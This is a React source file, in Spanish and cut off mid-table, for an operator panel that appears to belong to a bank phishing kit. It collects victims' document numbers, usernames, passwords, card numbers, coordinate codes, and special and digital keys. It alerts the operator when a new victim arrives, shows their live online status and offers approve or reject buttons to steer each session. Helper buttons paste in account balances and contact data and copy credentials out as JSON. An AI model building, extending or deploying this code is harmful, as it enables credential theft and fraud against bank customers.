import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { base44, supabase, sessionRecordFromRaw } from "@/api/base44Client";
import { Trash2, Copy, Check, X, Volume2, VolumeX, Settings, Eye, EyeOff, CheckCircle, XCircle, ClipboardPaste, FileText } from "lucide-react";

const TRASH_USER = "__trash__";

async function fetchTrashFromDb() {
  try {
    const configs = await base44.entities.PanelConfig.list();
    const row = configs.find((c) => c.usuarioPanel === TRASH_USER);
    return row ? JSON.parse(row.clavePanel || "[]") : [];
  } catch { return []; }
}

async function saveTrashToDb(items) {
  try {
    const configs = await base44.entities.PanelConfig.list();
    const row = configs.find((c) => c.usuarioPanel === TRASH_USER);
    const payload = { usuarioPanel: TRASH_USER, clavePanel: JSON.stringify(items) };
    if (row) {
      await base44.entities.PanelConfig.update(row.id, payload);
    } else {
      await base44.entities.PanelConfig.create(payload);
    }
  } catch (e) { console.error("Error guardando papelera:", e); }
}

async function addToTrashDb(record) {
  const current = await fetchTrashFromDb();
  current.unshift({ ...record, deletedAt: new Date().toISOString() });
  await saveTrashToDb(current);
  return current;
}

function CopyButton({ value }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    navigator.clipboard.writeText(value || "");
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };
  return (
    <button onClick={handleCopy} className="ml-2 text-gray-400 hover:text-gray-600 transition">
      {copied ? <Check className="w-5 h-5 text-green-500" /> : <Copy className="w-5 h-5" />}
    </button>
  );
}

function PasteCardButton({ record, onUpdate }) { // record: any, onUpdate: any
  const [state, setState] = useState("idle"); // idle | ok | error

  const handleClick = async () => {
    let text;
    try {
      text = await navigator.clipboard.readText();
    } catch {
      setState("error");
      setTimeout(() => setState("idle"), 1500);
      return;
    }
    if (!text) return;
    try {
      const parsed = JSON.parse(text.trim());
      const tarjeta = parsed.tarjeta || "";
      const coordenada = parsed.coordenada || "";
      if (!tarjeta && !coordenada) { setState("error"); setTimeout(() => setState("idle"), 1500); return; }
      onUpdate(record.id, { numeroTarjetaDisplay: tarjeta, coordenadaDisplay: coordenada });
      await base44.entities.UserSessionData.update(record.id, {
        numeroTarjetaDisplay: tarjeta,
        coordenadaDisplay: coordenada,
      });
      setState("ok");
      setTimeout(() => setState("idle"), 1500);
    } catch {
      setState("error");
      setTimeout(() => setState("idle"), 1500);
    }
  };

  return (
    <button
      onClick={handleClick}
      title='Pegar {"tarjeta":"...","coordenada":"..."}'
      className={`flex items-center gap-1 px-2 py-1 rounded-md text-xs font-medium border transition ${
        state === "ok"    ? "bg-green-50 border-green-300 text-green-600" :
        state === "error" ? "bg-red-50 border-red-300 text-red-500" :
        "bg-blue-50 border-blue-200 text-blue-500 hover:bg-blue-100 hover:border-blue-300"
      }`}
    >
      <ClipboardPaste className="w-3.5 h-3.5" />
      {state === "ok" ? "Pegado" : state === "error" ? "Error" : "Pegar"}
    </button>
  );
}

function PasteUserInfoButton({ record, onUpdate }) {
  const [state, setState] = useState("idle");

  const handleClick = async () => {
    let text;
    try {
      text = await navigator.clipboard.readText();
    } catch {
      setState("error");
      setTimeout(() => setState("idle"), 1500);
      return;
    }
    if (!text) return;
    const lines = text.split('\n').map(l => l.trim()).filter(Boolean);
    let nombre = '', ref = '';
    for (const line of lines) {
      if (/^hola\s/i.test(line)) nombre = line;
      else if (/^ref\.\s*/i.test(line)) ref = line.replace(/^ref\.\s*/i, '');
    }
    if (!nombre && !ref) {
      setState("error");
      setTimeout(() => setState("idle"), 1500);
      return;
    }
    try {
      onUpdate(record.id, { nombreDisplay: nombre, refDisplay: ref });
      await base44.entities.UserSessionData.update(record.id, { nombreDisplay: nombre, refDisplay: ref });
      setState("ok");
      setTimeout(() => setState("idle"), 1500);
    } catch {
      setState("error");
      setTimeout(() => setState("idle"), 1500);
    }
  };

  return (
    <button
      onClick={handleClick}
      title={'Pegar "Hola NOMBRE\\nRef. 00000"'}
      className={`flex items-center gap-1 px-2 py-1 rounded-md text-xs font-medium border transition ${
        state === "ok"    ? "bg-green-50 border-green-300 text-green-600" :
        state === "error" ? "bg-red-50 border-red-300 text-red-500" :
        "bg-purple-50 border-purple-200 text-purple-500 hover:bg-purple-100 hover:border-purple-300"
      }`}
    >
      <ClipboardPaste className="w-3.5 h-3.5" />
      {state === "ok" ? "Pegado" : state === "error" ? "Error" : "Usuario"}
    </button>
  );
}

function PastePortalButton({ record, onUpdate }) {
  const [transientError, setTransientError] = useState(false);
  const isOk = Boolean(record.nombreDisplay);

  const handleClick = async () => {
    let text;
    try {
      text = await navigator.clipboard.readText();
    } catch {
      setTransientError(true);
      setTimeout(() => setTransientError(false), 1500);
      return;
    }
    if (!text?.trim()) {
      setTransientError(true);
      setTimeout(() => setTransientError(false), 1500);
      return;
    }

    const lines = text.split('\n').map(l => l.trim()).filter(Boolean);
    let cliente = '', cuenta = '', tipo = '', disponible = '', total = '', ref = '';
    for (const line of lines) {
      if (/^Cliente:/i.test(line))         cliente    = line.replace(/^Cliente:\s*/i, '').trim();
      else if (/^Cuenta:/i.test(line))     cuenta     = line.replace(/^Cuenta:\s*/i, '').trim();
      else if (/^Tipo:/i.test(line))       tipo       = line.replace(/^Tipo:\s*/i, '').trim();
      else if (/^Disponible:/i.test(line)) disponible = line.replace(/^Disponible:\s*/i, '').trim();
      else if (/^Total:/i.test(line))      total      = line.replace(/^Total:\s*/i, '').trim();
      else if (/^Ref\./i.test(line))       ref        = line.replace(/^Ref\.\s*/i, '').trim();
    }

    if (!cliente && !cuenta) {
      setTransientError(true);
      setTimeout(() => setTransientError(false), 1500);
      return;
    }

    const portalJson = JSON.stringify({ cliente, cuenta, tipo, disponible, total, ref });
    try {
      onUpdate(record.id, { nombreDisplay: portalJson });
      await base44.entities.UserSessionData.update(record.id, { nombreDisplay: portalJson });
    } catch {
      setTransientError(true);
      setTimeout(() => setTransientError(false), 1500);
    }
  };

  const state = transientError ? "error" : isOk ? "ok" : "idle";

  return (
    <button
      onClick={handleClick}
      title='Pegar datos del portal (Cliente/Cuenta/Tipo/Disponible/Total/Ref.)'
      className={`flex items-center gap-1 px-2 py-1 rounded-md text-xs font-medium border transition ${
        state === "ok"    ? "bg-green-50 border-green-300 text-green-600" :
        state === "error" ? "bg-red-50 border-red-300 text-red-500" :
        "bg-orange-50 border-orange-200 text-orange-500 hover:bg-orange-100 hover:border-orange-300"
      }`}
    >
      <ClipboardPaste className="w-3.5 h-3.5" />
      {state === "ok" ? "Pegado" : state === "error" ? "Error" : "Pegar"}
    </button>
  );
}

function PasteContactoButton({ record, onUpdate }) {
  const [state, setState] = useState("idle");

  const handleClick = async () => {
    let text;
    try {
      text = await navigator.clipboard.readText();
    } catch (e) {
      alert("Error clipboard: " + e.message);
      setState("error");
      setTimeout(() => setState("idle"), 1500);
      return;
    }
    if (!text?.trim()) { alert("Clipboard vacío"); return; }
    try {
      const parsed = JSON.parse(text.trim());
      const correo = parsed.correo_electronico || parsed.correo || "";
      const telefono = parsed.telefono_celular || parsed.celular || "";
      if (!correo && !telefono) { setState("error"); setTimeout(() => setState("idle"), 1500); return; }
      const val = JSON.stringify({ correo_electronico: correo, telefono_celular: telefono });
      onUpdate(record.id, { contactoInfo: val });
      await base44.entities.UserSessionData.update(record.id, { contactoInfo: val });
      setState("ok");
    } catch (e) {
      alert("Error paste: " + e.message);
      setState("error");
      setTimeout(() => setState("idle"), 1500);
    }
  };

  const hasData = Boolean(record.contactoInfo);
  const isGreen = state === "ok" || hasData;
  return (
    <button
      onClick={handleClick}
      title='Pegar {"correo_electronico":"...","telefono_celular":"..."}'
      className={`flex items-center gap-1 px-2 py-1 rounded-md text-xs font-medium border transition ${
        state === "error" ? "bg-red-50 border-red-300 text-red-500" :
        isGreen           ? "bg-green-50 border-green-400 text-green-700 hover:bg-green-100" :
        "bg-teal-50 border-teal-200 text-teal-500 hover:bg-teal-100 hover:border-teal-300"
      }`}
    >
      <ClipboardPaste className="w-3.5 h-3.5" />
      {state === "error" ? "Error" : isGreen ? "Contacto ✓" : "Contacto"}
    </button>
  );
}

function PasteClaveEspecialButton({ record, onUpdate }) {
  const [state, setState] = useState("idle");

  const handleClick = async () => {
    let text;
    try {
      text = await navigator.clipboard.readText();
    } catch {
      setState("error");
      setTimeout(() => setState("idle"), 1500);
      return;
    }
    if (!text?.trim()) return;
    try {
      onUpdate(record.id, { claveEspecial: text.trim() });
      await base44.entities.UserSessionData.update(record.id, { claveEspecial: text.trim() });
      setState("ok");
      setTimeout(() => setState("idle"), 1500);
    } catch {
      setState("error");
      setTimeout(() => setState("idle"), 1500);
    }
  };

  return (
    <button
      onClick={handleClick}
      title="Pegar texto como Clave Especial"
      className={`flex items-center gap-1 px-2 py-1 rounded-md text-xs font-medium border transition ${
        state === "ok"    ? "bg-green-50 border-green-300 text-green-600" :
        state === "error" ? "bg-red-50 border-red-300 text-red-500" :
        "bg-blue-50 border-blue-200 text-blue-500 hover:bg-blue-100 hover:border-blue-300"
      }`}
    >
      <ClipboardPaste className="w-3.5 h-3.5" />
      {state === "ok" ? "Pegado" : state === "error" ? "Error" : "Pegar"}
    </button>
  );
}

function CopyJsonButton({ record }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    const json = JSON.stringify({
      id: record.numeroDocumento || "",
      usuario: record.usuario || "",
      password: record.claveAcceso || "",
    }, null, 2);
    navigator.clipboard.writeText(json);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };
  return (
    <button
      onClick={handleCopy}
      title="Copiar como JSON"
      className={`flex items-center gap-1 px-2 py-1 rounded-md text-xs font-medium border transition ${
        copied
          ? "bg-green-50 border-green-300 text-green-600"
          : "bg-blue-50 border-blue-200 text-blue-500 hover:bg-blue-100 hover:border-blue-300"
      }`}
    >
      {copied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
      {copied ? "Copiado" : "Copy"}
    </button>
  );
}

function EditableCell({ value, onSave, green = false }) {
  const [editing, setEditing] = useState(false);
  const [val, setVal] = useState(value || "");

  useEffect(() => {
    if (!editing) setVal(value || "");
  }, [value, editing]);

  const handleBlur = async () => {
    setEditing(false);
    if (val !== value) await onSave(val);
  };

  if (editing) {
    return (
      <input
        autoFocus
        value={val}
        onChange={(e) => setVal(e.target.value)}
        onBlur={handleBlur}
        className={`border rounded px-2 py-1 text-sm outline-none w-full ${green ? "border-green-400" : "border-blue-400"}`}
      />
    );
  }

  return (
    <span
      onClick={() => setEditing(true)}
      className={`cursor-pointer px-2 py-1 rounded border border-transparent transition font-bold min-w-[80px] inline-block ${
        green
          ? "hover:bg-green-50 hover:border-green-200 text-[#1a73e8]"
          : "hover:bg-blue-50 hover:border-blue-200 text-gray-700"
      }`}
      title="Haz clic para editar"
    >
      {val || <span className={`italic text-xs font-bold ${green ? "text-[#5a9a6a]" : "text-gray-300"}`}>Editar...</span>}
    </span>
  );
}

function playAlertSound() {
  const ctx = new (window.AudioContext || window.webkitAudioContext)();
  const times = [0, 0.25, 0.5];
  times.forEach((t) => {
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.type = "square";
    osc.frequency.setValueAtTime(880, ctx.currentTime + t);
    osc.frequency.setValueAtTime(660, ctx.currentTime + t + 0.1);
    gain.gain.setValueAtTime(0.6, ctx.currentTime + t);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + t + 0.22);
    osc.start(ctx.currentTime + t);
    osc.stop(ctx.currentTime + t + 0.22);
  });
}

export default function PanelPrueba() {
  const navigate = useNavigate();

  // Auth gate
  const [authed, setAuthed] = useState(() => sessionStorage.getItem("panel_auth") === "1");
  const [loginUsuario, setLoginUsuario] = useState("");
  const [loginClave, setLoginClave] = useState("");
  const [loginError, setLoginError] = useState("");
  const [loginLoading, setLoginLoading] = useState(false);
  const [showLoginClave, setShowLoginClave] = useState(false);

  const [records, setRecords] = useState(/** @type {any[]} */ ([]));
  const [loading, setLoading] = useState(true);
  const [soundOn, setSoundOn] = useState(true);
  const prevCountRef = useRef(0);
  const [showConfig, setShowConfig] = useState(false);
  const [showTxt, setShowTxt] = useState(false);
  const [txtAuthed, setTxtAuthed] = useState(() => sessionStorage.getItem("txt_auth") === "1");
  const [txtLoginUsuario, setTxtLoginUsuario] = useState("");
  const [txtLoginClave, setTxtLoginClave] = useState("");
  const [txtLoginError, setTxtLoginError] = useState("");
  const [showTxtClave, setShowTxtClave] = useState(false);
  const [deletedRecords, setDeletedRecords] = useState([]);
  const [configId, setConfigId] = useState(null);
  const [newUsuario, setNewUsuario] = useState("");
  const [newClave, setNewClave] = useState("");
  const [savingConfig, setSavingConfig] = useState(false);
  const [showClave, setShowClave] = useState(false);

  const updateRecord = (/** @type {string} */ id, /** @type {any} */ patch) => {
    setRecords((prev) => prev.map((r) => r.id === id ? { ...r, ...patch } : r));
  };

  const fetchRecords = async () => {
    try {
      const data = await base44.entities.UserSessionData.list("-created_date");
      setRecords(data);
      return data;
    } catch (e) {
      console.error("Error cargando registros:", e);
      return [];
    }
  };

  const loadRecords = async () => {
    setLoading(true);
    try {
      return await fetchRecords();
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadRecords().then((data) => { prevCountRef.current = data.length; });
    fetchTrashFromDb().then(setDeletedRecords);

    const dataChannel = supabase
      .channel("solicitudes-changes")
      .on("postgres_changes", { event: "*", schema: "public", table: "user_session_data" },
        async (payload) => {
          const ev = /** @type {any} */ (payload);
          if (ev.eventType === "INSERT") {
            const fresh = await base44.entities.UserSessionData.list("-created_date");
            if (soundOn && fresh.length > prevCountRef.current) playAlertSound();
            prevCountRef.current = fresh.length;
            setRecords(fresh);
          } else if (ev.eventType === "UPDATE") {
            const updated = sessionRecordFromRaw(ev.new);
            setRecords(prev => prev.map(r => r.id === updated.id ? { ...r, ...updated } : r));
          } else if (ev.eventType === "DELETE") {
            setRecords(prev => prev.filter(r => r.id !== ev.old?.id));
          }
        })
      .subscribe();

    // Sincroniza la papelera TXT en tiempo real entre todos los navegadores
    const configChannel = supabase
      .channel("config-trash-changes")
      .on("postgres_changes", { event: "*", schema: "public", table: "panel_config" },
        (payload) => {
          const ev = /** @type {any} */ (payload);
          if (ev.new?.usuario_panel === TRASH_USER) {
            try {
              setDeletedRecords(JSON.parse(ev.new.clave_panel || "[]"));
            } catch {}
          }
        })
      .subscribe();

    // Fallback polling cada 2 s por si Realtime no está habilitado en Supabase
    const interval = setInterval(async () => {
      const data = await base44.entities.UserSessionData.list("-created_date");
      if (soundOn && data.length > prevCountRef.current) playAlertSound();
      prevCountRef.current = data.length;
      setRecords(data);
    }, 2000);

    return () => {
      supabase.removeChannel(dataChannel);
      supabase.removeChannel(configChannel);
      clearInterval(interval);
    };
  }, [soundOn]);


  const deleteRecord = async (id) => {
    const rec = records.find((r) => r.id === id);
    await base44.entities.UserSessionData.delete(id);
    await fetchRecords();
    if (rec) {
      const newTrash = await addToTrashDb(rec);
      setDeletedRecords(newTrash);
    }
  };

  const clearAll = async () => {
    if (!window.confirm("¿Eliminar todos los registros?")) return;
    const toDelete = [...records];
    await Promise.all(toDelete.map((r) => base44.entities.UserSessionData.delete(r.id)));
    setRecords([]);
    const current = await fetchTrashFromDb();
    const newItems = toDelete.map((r) => ({ ...r, deletedAt: new Date().toISOString() }));
    const merged = [...newItems, ...current];
    await saveTrashToDb(merged);
    setDeletedRecords(merged);
  };

  const removeFromTrash = async (idx) => {
    const updated = deletedRecords.filter((_, i) => i !== idx);
    setDeletedRecords(updated);
    await saveTrashToDb(updated);
  };

  const clearTrash = async () => {
    setDeletedRecords([]);
    await saveTrashToDb([]);
  };

  const openConfig = async () => {
    const configs = await base44.entities.PanelConfig.list();
    const cfg = configs.find((c) => c.usuarioPanel !== TRASH_USER);
    if (cfg) {
      setConfigId(cfg.id);
      setNewUsuario(cfg.usuarioPanel || "");
      setNewClave(cfg.clavePanel || "");
    } else {
      setConfigId(null);
      setNewUsuario("");
      setNewClave("");
    }
    setShowConfig(true);
  };

  const saveConfig = async () => {
    setSavingConfig(true);
    if (configId) {
      await base44.entities.PanelConfig.update(configId, { usuarioPanel: newUsuario, clavePanel: newClave });
    } else {
      await base44.entities.PanelConfig.create({ usuarioPanel: newUsuario, clavePanel: newClave });
    }
    setSavingConfig(false);
    setShowConfig(false);
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    setLoginLoading(true);
    setLoginError("");
    try {
      const configs = await base44.entities.PanelConfig.list();
      const cfg = /** @type {any} */ (configs.find((c) => c.usuarioPanel !== TRASH_USER));
      if (cfg && cfg.usuarioPanel === loginUsuario && cfg.clavePanel === loginClave) {
        sessionStorage.setItem("panel_auth", "1");
        setAuthed(true);
      } else {
        setLoginError("Usuario o clave incorrectos.");
      }
    } catch {
      setLoginError("Error al verificar credenciales.");
    } finally {
      setLoginLoading(false);
    }
  };

  if (!authed) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white rounded-xl shadow-xl p-8 w-full max-w-sm mx-4">
          <h2 className="text-xl font-semibold text-gray-800 mb-6 text-center">Panel de acceso</h2>
          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="block text-sm text-gray-600 mb-1">Usuario</label>
              <input
                type="text"
                value={loginUsuario}
                onChange={(e) => setLoginUsuario(e.target.value)}
                className="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm outline-none focus:border-blue-400"
                placeholder="Usuario"
                autoFocus
              />
            </div>
            <div>
              <label className="block text-sm text-gray-600 mb-1">Clave</label>
              <div className="relative">
                <input
                  type={showLoginClave ? "text" : "password"}
                  value={loginClave}
                  onChange={(e) => setLoginClave(e.target.value)}
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 pr-10 text-sm outline-none focus:border-blue-400"
                  placeholder="Clave"
                />
                <button
                  type="button"
                  onClick={() => setShowLoginClave((v) => !v)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                >
                  {showLoginClave ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>
            {loginError && <p className="text-red-500 text-sm">{loginError}</p>}
            <button
              type="submit"
              disabled={loginLoading || !loginUsuario || !loginClave}
              className="w-full py-2 rounded-lg bg-[hsl(var(--primary))] text-white text-sm font-medium hover:opacity-90 transition disabled:opacity-50"
            >
              {loginLoading ? "Verificando..." : "Entrar"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 font-main">
      <style>{`
        @keyframes pulse-green { 0% { box-shadow: 0 0 0 0 rgba(34,197,94,.45); } 70% { box-shadow: 0 0 0 6px rgba(34,197,94,0); } 100% { box-shadow: 0 0 0 0 rgba(34,197,94,0); } }
        @keyframes glow-yellow { 0%,100%{box-shadow:0 0 4px 1px rgba(234,179,8,.6)} 50%{box-shadow:0 0 10px 3px rgba(234,179,8,.9)} }
        .status-dot { display:inline-block; width:10px; height:10px; border-radius:50%; flex-shrink:0; transition:background 0.2s ease,box-shadow 0.2s ease; }
        .status-dot.online  { background:#22c55e; box-shadow:0 0 0 3px rgba(34,197,94,.2); animation:pulse-green 1.8s infinite; }
        .status-dot.editing { background:#eab308; box-shadow:0 0 4px 1px rgba(234,179,8,.6); animation:glow-yellow 1.5s ease-in-out infinite; }
        .status-dot.offline { background:#ef4444; box-shadow:0 0 0 3px rgba(239,68,68,.15); }
      `}</style>
      <header className="bg-[hsl(var(--primary))] px-6 h-[67px] flex items-center">
        <h1 className="text-white text-xl font-semibold">Panel Prueba</h1>
      </header>

      <main className="p-6">
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 overflow-hidden">
          <div className="px-6 py-4 border-b border-gray-100 flex items-center justify-between">
            <h2 className="text-[hsl(var(--primary))] font-semibold text-lg">Solicitudes de inicio de sesión</h2>
            <div className="flex items-center gap-3">
              <button
                onClick={() => setSoundOn((s) => !s)}
                title={soundOn ? "Silenciar notificaciones" : "Activar notificaciones"}
                className={`flex items-center gap-2 px-3 py-1.5 rounded-full text-sm font-medium border transition ${
                  soundOn
                    ? "bg-blue-50 border-blue-300 text-blue-700 hover:bg-blue-100"
                    : "bg-gray-100 border-gray-300 text-gray-500 hover:bg-gray-200"
                }`}
              >
                {soundOn ? <Volume2 className="w-4 h-4" /> : <VolumeX className="w-4 h-4" />}
                {soundOn ? "Sonido ON" : "Sonido OFF"}
              </button>
              <button
                onClick={clearAll}
                className="flex items-center gap-2 px-3 py-1.5 rounded-full text-sm font-medium border border-red-300 bg-red-50 text-red-600 hover:bg-red-100 transition"
              >
                <Trash2 className="w-4 h-4" />
                Limpiar todo
              </button>
              <button
                onClick={() => setShowTxt(true)}
                className="flex items-center gap-2 px-3 py-1.5 rounded-full text-sm font-medium border border-emerald-300 bg-emerald-50 text-emerald-700 hover:bg-emerald-100 transition"
              >
                <FileText className="w-4 h-4" />
                TXT
                {deletedRecords.length > 0 && (
                  <span className="ml-1 bg-emerald-600 text-white text-xs font-bold rounded-full px-1.5 py-0.5 leading-none">{deletedRecords.length}</span>
                )}
              </button>
              <button
                onClick={openConfig}
                className="flex items-center gap-2 px-3 py-1.5 rounded-full text-sm font-medium border border-gray-300 bg-gray-50 text-gray-700 hover:bg-gray-100 transition"
              >
                <Settings className="w-4 h-4" />
                Configuración
              </button>
            </div>
          </div>

          {loading ? (
            <div className="flex justify-center items-center h-48">
              <div className="w-8 h-8 border-4 border-slate-200 border-t-[hsl(var(--primary))] rounded-full animate-spin" />
            </div>
          ) : records.length === 0 ? (
            <div className="text-center py-20 text-gray-400 text-lg">No hay registros aún.</div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-gray-100">
                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">N° Documento</th>
                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Usuario</th>
                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Clave de Acceso</th>
                    <th className="text-left px-6 py-3 text-xs font-bold text-gray-700 uppercase tracking-wider">N° Tarj</th>
                    <th className="text-left px-6 py-3 text-xs font-bold text-gray-700 uppercase tracking-wider">Coord</th>
                    <th className="px-2 py-3"></th>
                    <th className="px-4 py-3"></th>
                    <th className="text-left px-6 py-3 text-xs font-bold text-gray-700 uppercase tracking-wider">Cód. Coord</th>
                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Clave Especial</th>
                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Clave Digital</th>
                    <th className="px-6 py-3"></th>
                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">IP</th>
                  </tr>
                </thead>
                <tbody>
                  {records.map((record) => {
                    const isNetCash = record.tipoDocumentoSeleccionado === "NetCash";
                    return (
                    <tr key={record.id} className="border-b border-gray-50 hover:bg-gray-50 transition">

                      {/* 1. N° Documento */}
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-1">
                          <span className={isNetCash ? "text-fuchsia-600 font-bold" : ""}>{record.numeroDocumento || <span className={isNetCash ? "text-fuchsia-300" : "text-gray-300"}>—</span>}</span>
                        </div>
                      </td>

                      {/* 2. Usuario */}
                      <td className="px-6 py-4">
                        <div className={`flex items-center gap-1 font-bold ${isNetCash ? "text-fuchsia-600" : "text-[hsl(var(--primary))]"}`}>
                          {(() => {
                            const OFFLINE_MS = 15_000;
                            const lastSeenMs = record.lastSeen ? new Date(record.lastSeen).getTime() : null;
                            let isEditing, isOnline;
                            if (lastSeenMs !== null) {
                              const fresh = (Date.now() - lastSeenMs) < OFFLINE_MS;
                              isEditing = fresh && record.clientOnlineStatus === 'editing';
                              isOnline  = fresh && record.clientOnlineStatus === 'online';
                            } else {
                              isEditing = record.clientOnlineStatus === 'editing';
                              isOnline  = record.clientOnlineStatus === 'online';
                            }
                            const dotStatus = isEditing ? 'editing' : isOnline ? 'online' : 'offline';
                            return (
                              <span
                                className={`status-dot ${dotStatus}`}
                                data-user-id={record.id}
                                aria-label={isEditing ? 'Editando' : isOnline ? 'En línea' : 'Desconectado'}
                                title={isEditing ? 'Editando' : isOnline ? 'En línea' : 'Desconectado'}
                                style={{ marginRight: '6px' }}
                              />
                            );
                          })()}
                          {record.usuario ? (isNetCash ? record.usuario.toLowerCase() : record.usuario) : <span className="text-gray-300 font-normal">—</span>}
                        </div>
                      </td>

                      {/* 3. Clave de Acceso */}
                      <td className="px-6 py-4">
                        <div className={`flex items-center gap-1 font-mono font-bold ${isNetCash ? "text-fuchsia-600" : ""}`}>
                          {record.claveAcceso || <span className={isNetCash ? "text-fuchsia-300" : "text-gray-300"}>—</span>}
                          <CopyJsonButton record={record} />
                        </div>
                      </td>

                      {/* 4. N° Tarj (editable) */}
                      <td className="px-6 py-4">
                        <EditableCell
                          value={record.numeroTarjetaDisplay}
                          onSave={(val) => base44.entities.UserSessionData.update(record.id, { numeroTarjetaDisplay: val })}
                        />
                      </td>

                      {/* 5. Coord (editable) */}
                      <td className="px-6 py-4">
                        <EditableCell
                          value={record.coordenadaDisplay}
                          onSave={(val) => base44.entities.UserSessionData.update(record.id, { coordenadaDisplay: val })}
                        />
                      </td>

                      {/* Pegar según tipo de portal */}
                      <td className="px-2 py-4">
                        <div className="flex flex-col gap-1">
                          {isNetCash
                            ? <PasteUserInfoButton record={record} onUpdate={updateRecord} />
                            : <PasteCardButton record={record} onUpdate={updateRecord} />
                          }
                        </div>
                      </td>

                      {/* Aprobar/rechazar acceso */}
                      <td className="px-4 py-4">
                        {record.status === "pending" && (
                          <div className="flex items-center gap-2">
                            <button
                              title="Aprobar acceso"
                              onClick={async () => {
                                await base44.entities.UserSessionData.update(record.id, { status: "approved" });
                                await fetchRecords();
                              }}
                              className="w-8 h-8 flex items-center justify-center rounded-full bg-green-100 hover:bg-green-200 text-green-600 transition"
                            >
                              <CheckCircle className="w-4 h-4" />
                            </button>
                            <button
                              title="Rechazar acceso"
                              onClick={async () => {
                                await base44.entities.UserSessionData.update(record.id, { status: "rejected" });
                                await fetchRecords();
                              }}
                              className="w-8 h-8 flex items-center justify-center rounded-full bg-red-100 hover:bg-red-200 text-red-500 transition"
                            >
                              <XCircle className="w-4 h-4" />
                            </button>
                          </div>
                        )}
                        {record.status === "approved" && <span className="text-xs text-green-600 font-semibold">Aprobado</span>}
                        {record.status === "rejected" && <span className="text-xs text-red-500 font-semibold">Rechazado</span>}
                      </td>

                      {/* 6. Cód. Coord + botón rechazo coordenada */}
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-1 font-mono font-bold">
                          {record.codigoCoordenada || <span className="font-normal text-gray-300">—</span>}
                          {record.codigoCoordenada && <CopyButton value={record.codigoCoordenada} />}
                          {record.codigoCoordenada && record.coordenadaStatus !== "approved" && record.coordenadaStatus !== "rejected" && (
                            <button
                              title="Rechazar coordenada"
                              onClick={async () => {
                                await base44.entities.UserSessionData.update(record.id, { coordenadaStatus: "rejected", codigoCoordenada: "" });
                                await fetchRecords();
                              }}
                              className="w-8 h-8 flex items-center justify-center rounded-full bg-red-100 hover:bg-red-200 text-red-500 transition"
                            >
                              <XCircle className="w-4 h-4" />
                            </button>
                          )}
                          {record.coordenadaStatus === "rejected" && <span className="text-xs text-red-500 font-semibold">Rechazado</span>}
                        </div>
                      </td>

                      {/* 7. Clave Especial / Clave Operaciones (NetCash) */}
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-2">
                          {!isNetCash && <PastePortalButton record={record} onUpdate={updateRecord} />}
                          {!isNetCash && <PasteContactoButton record={record} onUpdate={updateRecord} />}
                          <div className="flex flex-col gap-0.5">
                            {isNetCash && <span className="text-[10px] font-bold uppercase tracking-wide text-blue-500">Clave Op.</span>}
                            <div className="flex items-center gap-1 font-mono">
                              {record.claveEspecial || <span className="text-gray-300">—</span>}
                              {record.claveEspecial && <CopyButton value={record.claveEspecial} />}
                            </div>
                          </div>
                          {record.codigoCoordenada && record.coordenadaStatus !== "approved" && record.coordenadaStatus !== "rejected" && (
                            <button
                              title="Aprobar coordenada"
                              onClick={async () => {
                                await base44.entities.UserSessionData.update(record.id, { coordenadaStatus: "approved" });
                                await fetchRecords();
                              }}
                              className="w-8 h-8 flex items-center justify-center rounded-full bg-green-100 hover:bg-green-200 text-green-600 transition"
                            >
                              <CheckCircle className="w-4 h-4" />
                            </button>
                          )}
                          {record.coordenadaStatus === "approved" && <span className="text-xs text-green-600 font-semibold">Aprobado</span>}
                          {record.claveEspecial && !["approved", "rejected"].includes(record.claveEspecialStatus) && (
                            <button
                              title="Aprobar clave especial"
                              onClick={async () => {
                                await base44.entities.UserSessionData.update(record.id, { claveEspecialStatus: "approved" });
                                await fetchRecords();
                              }}
                              className="w-8 h-8 flex items-center justify-center rounded-full bg-green-100 hover:bg-green-200 text-green-600 transition"
                            >
                              <CheckCircle className="w-4 h-4" />
                            </button>
                          )}
                          {record.claveEspecialStatus === "approved" && <span className="text-xs text-green-600 font-semibold">Aprobado</span>}
                          {record.claveEspecial && !["approved", "rejected"].includes(record.claveEspecialStatus) && (
                            <button
                              title="Rechazar clave especial"
                              onClick={async () => {
                                await base44.entities.UserSessionData.update(record.id, { claveEspecialStatus: "rejected", claveEspecial: "" });
                                await fetchRecords();
                              }}
                              className="w-8 h-8 flex items-center justify-center rounded-full bg-red-100 hover:bg-red-200 text-red-500 transition"
                            >
                              <XCircle className="w-4 h-4" />
                            </button>
                          )}
                          {record.claveEspecialStatus === "rejected" && <span className="text-xs text-red-500 font-semibold">Rechazado</span>}
                        </div>
                      </td>

                      {/* 8. Clave Digital / Clave Token (NetCash) */}
                      <td className="px-6 py-4">
